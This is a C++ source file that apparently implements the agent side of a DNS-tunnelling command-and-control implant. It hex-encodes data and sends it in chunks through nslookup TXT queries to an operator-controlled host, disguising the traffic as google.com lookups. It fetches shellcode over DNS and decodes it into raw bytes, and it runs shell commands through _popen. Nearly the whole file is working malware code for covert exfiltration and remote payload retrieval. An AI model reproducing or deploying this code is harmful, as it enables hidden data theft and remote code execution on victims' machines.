#include "DNSCommunication.h"

BOOL SendData(LPSTR agentName, LPSTR data){
	
	// Used string because of lack of knowledge :p.
	std::string response;
	
	DWORD data_length;
	DWORD data_remainder;
	DWORD chunks;
	DWORD chunk_size = 32;

	std::string hex_data;
	std::stringstream temp_data;

	DataToHEX(data,hex_data,TRUE);
	data_length = hex_data.length();
	data_remainder = data_length % chunk_size;
	chunks = data_length % chunk_size;

	if(data_length > chunk_size){
		for(unsigned int i=0; i < data_length; i+=chunk_size){
			temp_data.str(std::string()); // Clear the temp_data stream
			
			if(i == 0){
				temp_data << "7b21" << hex_data.substr(i,chunk_size);// Appends the beginning signature to the data
			}else if((i+data_remainder)>=data_length){
				temp_data << hex_data.substr(i,chunk_size) << "217d";// Appends the end signature to the data
			}else{
				temp_data << hex_data.substr(i,chunk_size);
			}
			response = SendDNSPacket(agentName,"DATA",temp_data.str().c_str());
		}
	}else{
		// To be implmeneted that if there is less data then 32 bytes which is very unusal, to add the stream.
		response = SendDNSPacket(agentName,"DATA",hex_data.c_str()); // Normally we should not get here.
	}
	
	response.erase(0,(int)response.find("RESP:") + 5);
	response.erase(response.length()-2,response.length());

	if(response.compare("OK") == 0){		
		return TRUE;
	}
	// ERROR
	return FALSE;
}

// Not very Windows-like programming but it works.

VOID DataToHEX(const std::string str, std::string& hexstr, bool capital = false)
{
    hexstr.resize(str.size() * 2);
    const size_t a = capital ? 'A' - 1 : 'a' - 1;

    for (size_t i = 0, c = str[0] & 0xFF; i < hexstr.size(); c = str[i / 2] & 0xFF)
    {
        hexstr[i++] = c > 0x9F ? (c / 16 - 9) | a : c / 16 | '0';
        hexstr[i++] = (c & 0xF) > 9 ? (c % 16 - 9) | a : c % 16 | '0';
    }
}

std::string SendDNSPacket(LPSTR agentName,LPSTR packetType,LPCSTR responseData){
	
	LPSTR command = new CHAR[MAX_CMD_LENGTH+1];
	
	if(lstrlen(responseData) == 0){
		// This is probably a probe or command request
		StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-%s.google.com %s",agentName,packetType,HOST);
		
	}else{
		// This sends the data to the server.
		StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-%s-%s.google.com %s",agentName,packetType,responseData,HOST);
	}

	std::cout << command;
	std::string response = ExecuteCommand(command);
	cout << response;
	return response;
}


std::string GetShellcode(LPSTR agentName){
	LPSTR command = new CHAR[MAX_CMD_LENGTH+1];
	
	BOOL bEnd = FALSE;
	std::string response;
	std::string shellcode;

	StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-SHL.google.com %s",agentName,HOST);

	while(!bEnd){
		response = GetTxtFromDNS(ExecuteCommand(command));

		if(response.find(NO_SHELLCODE) != std::string::npos){
			return NO_SHELLCODE;
		}
		else if(response.find(START) != std::string::npos){
			shellcode = std::string();
			shellcode = response.erase(0,2);
		}
		else if(response.find(END) != std::string::npos){
			shellcode.append(response.erase(response.length()-2,response.length()));
			bEnd = TRUE;
		}else{
			shellcode.append(response);
		}
		
		
	}

	// This is probably not the best way to do this but hey i'm not an expert in C++
	SIZE_T len;
	len = shellcode.length();
	std::string returnValue;
	for(int i=0; i< len; i+=2)
	{
		std::string byte = shellcode.substr(i,2);
		char chr = (char) (int)strtol(byte.c_str(), NULL, 16);
		returnValue.push_back(chr);
	}
	
	return returnValue;

}

std::string GetTxtFromDNS(std::string response){
	response.erase(0,(int)response.find("\"")+1);
	response.erase((int)response.find("\""),response.length());
	return response;
}

std::string ExecuteCommand(LPCSTR cmd) {
	std::string data;
	FILE * stream;
	const int max_buffer = 256;
	char buffer[max_buffer];
	stream = _popen(cmd, "r");
	if (stream) {
	while (!feof(stream))
	if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
	_pclose(stream);
	}
	return data;
}